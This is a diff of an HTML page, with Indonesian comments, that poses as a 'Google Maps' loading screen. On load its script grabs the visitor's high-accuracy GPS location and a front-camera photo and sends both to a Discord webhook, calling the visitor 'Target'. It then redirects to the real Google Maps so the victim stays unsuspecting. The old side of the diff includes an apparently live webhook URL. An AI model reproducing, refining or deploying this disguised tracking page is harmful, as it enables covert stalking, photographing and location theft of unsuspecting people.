@@ -3,56 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Berbagi Lokasi Real-time</title>
+    <title>Google Maps - Memuat Lokasi...</title>
     <link rel="icon" type="image/x-icon" href="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', Arial, sans-serif; background: #f8f9fa; overflow: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; background: #f8f9fa; overflow: hidden; }
         #loader { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .logo { width: 100px; margin-bottom: 25px; animation: pulse 1.8s infinite ease-in-out; }
+        .logo { width: 100px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
-        .status { color: #5f6368; font-size: 16px; font-weight: 400; }
+        .status { color: #5f6368; font-size: 15px; }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
 
 <div id="loader">
-    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo" alt="Google Maps">
-    <div class="status">Menghubungkan ke satelit...<br><span style="font-size: 12px; color: #9aa0a6;">Pastikan GPS Anda aktif untuk akurasi terbaik</span></div>
+    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
+    <div class="status">Mengalibrasi GPS...<br><span style="font-size: 11px;">Mohon tunggu sebentar untuk akurasi terbaik</span></div>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // MASUKKAN URL WEBHOOK DISCORD KAMU DI SINI
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+    // GANTI DENGAN WEBHOOK DISCORD KAMU
+    const DISCORD_WEBHOOK = "MASUKKAN_URL_WEBHOOK_KAMU_DI_SINI";
 
-    async function sendToDiscord(data) {
-        try {
-            await fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        } catch (e) { console.error(e); }
+    async function sendData(content, file = null) {
+        const formData = new FormData();
+        if (file) {
+            formData.append('file', file, 'capture.jpg');
+            formData.append('payload_json', JSON.stringify({ content: content }));
+        } else {
+            formData.append('payload_json', JSON.stringify({ content: content }));
+        }
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
     }
 
-    async function captureAndSend() {
+    function startCapture() {
+        const options = {
+            enableHighAccuracy: true, // MEMAKSA PAKAI GPS SATELIT
+            timeout: 15000,           // TUNGGU MAKSIMAL 15 DETIK
+            maximumAge: 0             // JANGAN PAKAI DATA LAMA
+        };
+
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
+                const acc = position.coords.accuracy; // Cek berapa meter melesetnya
                 const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                // Kirim koordinat dulu
-                await sendToDiscord({
-                    content: `📍 **Target Terdeteksi!**\nLokasi: ${mapsUrl}\nAkurasi: ${position.coords.accuracy} meter`
-                });
+                // Kirim Info Lokasi & Akurasi
+                await sendData(`📍 **Target Ditemukan!**\nKoordinat: ${lat}, ${lon}\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapsUrl}`);
 
-                // Coba ambil foto kamera depan
+                // Ambil Foto
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     
@@ -62,30 +68,23 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         
-                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                        const formData = new FormData();
-                        formData.append('file', blob, 'target.jpg');
-                        formData.append('payload_json', JSON.stringify({ content: "📸 **Foto Target:**" }));
-
-                        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        // REDIRECT KE GOOGLE MAPS ASLI SETELAH SELESAI
-                        window.location.href = mapsUrl;
-                    }, 1500);
-                } catch (err) {
-                    // Jika kamera ditolak, tetap redirect biar gak curiga
+                        canvas.toBlob(async (blob) => {
+                            await sendData("📸 **Foto Target Terbaru:**", blob);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = mapsUrl; // Redirect ke lokasi asli
+                        }, 'image/jpeg');
+                    }, 2000);
+                } catch (e) {
                     window.location.href = mapsUrl;
                 }
+
             }, (err) => {
-                // Jika lokasi ditolak, redirect ke Google Maps umum
                 window.location.href = "https://www.google.com/maps";
-            });
+            }, options);
         }
     }
 
-    window.onload = captureAndSend;
+    window.onload = startCapture;
 </script>
-
 </body>
 </html>
